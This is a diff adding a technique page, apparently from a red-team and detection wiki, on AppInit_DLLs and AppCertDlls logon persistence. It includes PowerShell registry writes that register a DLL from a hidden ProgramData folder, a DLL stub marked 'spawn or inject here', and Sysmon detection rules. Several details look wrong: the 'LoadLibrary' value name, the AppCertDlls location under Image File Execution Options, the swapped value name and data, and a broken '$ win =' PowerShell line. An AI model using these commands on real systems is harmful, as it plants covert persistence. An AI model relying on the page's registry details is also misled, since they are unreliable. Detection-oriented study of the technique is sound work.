@@ -1,0 +1,186 @@
+---
+title: AppInit_DLLs & AppCertDlls
+mitre: T1547.001
+category: persistence
+group: Boot / Logon Autostart
+summary: Register a DLL that Explorer or every new process loads at logon through AppInit or an AppCert certification hook.
+platform: [Windows]
+tags: ['Registry', 'DLL', 'Winlogon', 'Explorer']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: Write AppInit_DLLs
+    desc: A value under Windows\Load with LoadLibrary=1 makes Explorer load the DLL at user logon.
+    dll: advapi32
+  - call: or install AppCertDlls
+    desc: A value under Image File Execution Options\AppCertDlls makes the loader call into the DLL before a process starts.
+    dll: advapi32
+  - call: The payload lands in the host
+    desc: AppInit_DLLs lands in explorer.exe; AppCertDlls can land in every process unless filtered out.
+    dll: ntdll
+  - call: Code runs at logon or process start
+    desc: DllMain, or the AppCert callback, executes with the identity of the host process.
+    dll: '-'
+detections:
+  - src: SYSMON EID 13
+    text: AppInit_DLLs is set to a non-empty value; on a clean system the value is empty or absent.
+  - src: SYSMON EID 7
+    text: A DLL outside the system32 directory is loaded into explorer.exe at user logon.
+  - src: SYSMON EID 13
+    text: A value is created under Image File Execution Options\AppCertDlls.
+  - src: BEHAVIOURAL
+    text: The same non-system DLL appears across a broad set of unrelated processes shortly after a registry change.
+related:
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: The lower-impact sibling; Run keys also fire at logon but only in the user's own shell.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1547.004
+    title: Winlogon Userinit
+    desc: The logon-execution path one step earlier in the shell startup sequence.
+    href: /techniques/persistence/winlogon-userinit
+  - mitre: T1574.001
+    title: DLL Hijacking
+    desc: The load-order technique; AppInit and AppCert are the registry-configured variants of forcing a DLL load.
+    href: /techniques/persistence/dll-hijacking
+  - mitre: T1542.003
+    title: Boot Persistence
+    desc: The pre-boot baseline; AppInit and AppCert sit after the kernel, at the user-logon boundary.
+    href: /techniques/persistence/boot-persistence
+labKit:
+  - label: Registry persistence lab
+    href: /lab
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+`AppInit_DLLs` is a legacy autostart mechanism. It sits under
+`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows` and, when the companion
+`LoadLibrary` value is set to `1`, the user32 loader asks `explorer.exe` to load every DLL listed
+in the value at user logon. Because Explorer is the shell, anything loaded there runs with the
+logged-on user's rights, persists across reboots, and does so without a visible process of its
+own. It is a quiet, logon-scoped persistence hook that predates the modern autostart handlers.
+
+`AppCertDlls` is the heavier sibling. It sits under
+`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AppCertDlls`
+and tells the image loader to call into the listed DLLs as part of process creation, before the
+target's own entry point runs. Done well, the payload lands in nearly every new process on the
+machine. Done carelessly, it lands in too many, crashes something signed, and gives the analyst
+a very loud signal. The two mechanisms are often described together because they both force a
+DLL load through a registry value, but their blast radius and their detection profiles are
+different enough to treat them as one page with two distinct plays.
+
+<Callout type="caution">
+  AppCertDlls is a system-wide image-load hook. A DLL that misbehaves in one process misbehaves
+  in every process that loads it, and the OS will logon-fail or blue-screen if the hook faults at
+  the wrong point. Most mature AppCert payloads filter by process name, skip early-boot processes,
+  and no-op in anything that is not the intended host. That filtering is also what the detection
+  should look for: a brand-new DLL appearing across an unusually wide process set.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+Both variants are registry writes. The AppInit path is a single value pair under the Windows key;
+the AppCert path is a value under the Image File Execution Options subtree.
+
+<CodeBlock
+  file="appinit.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# AppInit_DLLs: loaded by Explorer at user logon
+$ win = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows'
+Set-ItemProperty $win -Name AppInit_DLLs -Value 'C:\\ProgramData\\.u\\init.dll'
+Set-ItemProperty $win -Name LoadLibrary    -Value 1
+
+# confirm
+Get-ItemProperty $win | Select-Object AppInit_DLLs, LoadLibrary`}
+/>
+
+The AppCert path registers a DLL the loader will call into for new processes. The value name is
+the DLL path; the data is a small integer the loader uses as a handle for the hook.
+
+<CodeBlock
+  file="appcert.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# AppCertDlls: loaded by the OS for new processes
+$ appcert = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AppCertDlls'
+New-Item $appcert -Force | Out-Null
+Set-ItemProperty $appcert -Name 'C:\\ProgramData\\.u\\cert.dll' -Value 1
+
+# confirm
+Get-Item $appcert | ForEach-Object { Get-ItemProperty $_.PSPath }`}
+/>
+
+The DLL itself exports the callback the loader expects. For AppInit the entry point is the
+standard `DllMain`; for AppCert the loader looks for the certification-export convention the
+system uses for image-load callbacks.
+
+<CodeBlock
+  file="appcert_stub.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// AppInit path: standard DLL entry, fires when explorer loads it
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // spawn or inject here; runs as the logged-on user
+    }
+    return TRUE;
+}
+
+// AppCert path: the loader calls the certification export for each new process
+// a real payload filters by process name and no-ops for early-boot images`}
+/>
+
+## Verifying in the lab
+
+Write the AppInit value, log off and back on, and confirm the DLL is mapped into `explorer.exe`.
+For AppCert, write the value, launch a fresh process, and confirm the DLL is mapped into that
+process before its own code runs. The proof is the module list, not a new process name.
+
+<CodeBlock
+  file="lab_check"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# after logon, the module is the artifact
+$ tasklist /m /fi "imagename eq explorer.exe"
+explorer.exe   ...   init.dll
+
+# for AppCert, any fresh process shows the hook module
+$ tasklist /m /fi "imagename eq notepad.exe"
+notepad.exe    ...   cert.dll  <-- the artifact`}
+/>
+
+## Detection
+
+The registry write is the setup; the module load is the confirmation.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the EID 13 rule on `AppInit_DLLs` and `AppCertDlls` is the cheapest continuous
+control and fires at setup time. The EID 7 rule on a non-system DLL inside `explorer.exe` is the
+AppInit confirmation and needs a baseline of legitimate shell extensions. The broad-process-set
+behavioural rule is the AppCert confirmation and is the one to tune for a fleet, because a
+single-process AppCert hit is easy to miss in the noise.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
